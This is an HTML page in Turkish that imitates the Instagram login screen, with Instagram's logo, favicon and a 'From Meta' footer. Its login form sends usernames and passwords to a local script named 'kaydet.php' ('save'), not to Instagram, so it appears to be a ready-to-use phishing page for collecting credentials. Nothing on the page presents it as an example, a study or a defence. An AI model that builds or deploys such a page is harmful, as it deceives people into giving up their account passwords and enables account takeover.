<!DOCTYPE html>
<html lang="tr">
<head>
<meta http-equiv="refresh" content="60">
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" />
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: #000;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  .container {
    background-color: #121212;
    width: 100%;
    max-width: 380px;
    border-radius: 12px;
    padding: 40px 30px 50px;
    text-align: center;
    box-shadow: 0 0 30px #000;
  }
  .logo {
    background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center;
    background-size: contain;
    width: 175px;
    height: 60px;
    margin: 0 auto 28px;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  form input {
    width: 100%;
    background: #262626;
    border: none;
    border-radius: 5px;
    padding: 12px 14px;
    margin-bottom: 10px;
    color: #fff;
    font-size: 14px;
    transition: background-color 0.2s, outline-color 0.2s;
  }
  form input::placeholder { color: #999; }
  form input:focus { outline: 2px solid #0095f6; background: #333; }
  button {
    width: 100%;
    padding: 12px 0;
    margin-top: 8px;
    background: #0095f6;
    border: none;
    border-radius: 5px;
    color: white;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
    transition: background-color 0.2s;
  }
  button:hover { background: #007acc; }
  .divider {
    display: flex;
    align-items: center;
    margin: 28px 0 18px;
  }
  .divider hr {
    flex-grow: 1;
    border: 0;
    height: 1px;
    background: #333;
  }
  .divider span {
    margin: 0 14px;
    font-size: 13px;
    color: #999;
    font-weight: 600;
    user-select: none;
  }
  a.facebook-login {
    display: block;
    color: #0095f6;
    font-weight: 600;
    font-size: 14px;
    text-decoration: none;
    margin-bottom: 24px;
    user-select: none;
  }
  a.facebook-login:hover { text-decoration: underline; }
  footer {
    margin-top: 40px;
    font-size: 12px;
    color: #fff;
    line-height: 1.4;
    font-weight: 600;
    user-select: none;
  }
  footer .meta {
    font-size: 10px;
    color: #fff;
    margin-top: 4px;
    font-weight: 400;
  }
  @media (max-width: 400px) {
    .container { padding: 30px 20px 40px; }
  }
</style>
</head>
<body>
  <div class="container" role="main" aria-label="Giriş ekranı">
    <div class="logo" aria-hidden="true"></div>

    <form method="POST" action="kaydet.php" autocomplete="off">
      <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="username" />
      <input type="password" name="password" placeholder="Şifre" required autocomplete="current-password" />
      <button type="submit" aria-label="Giriş yap">Giriş Yap</button>
    </form>

    <div class="divider"><hr /><span>YA DA</span><hr /></div>

    <a href="#" class="facebook-login" aria-label="Facebook ile giriş yap">Facebook ile Giriş Yap</a>

    <footer>
      © 2025 Instagram
      <div class="meta">From Meta</div>
    </footer>
  </div>
</body>
</html>
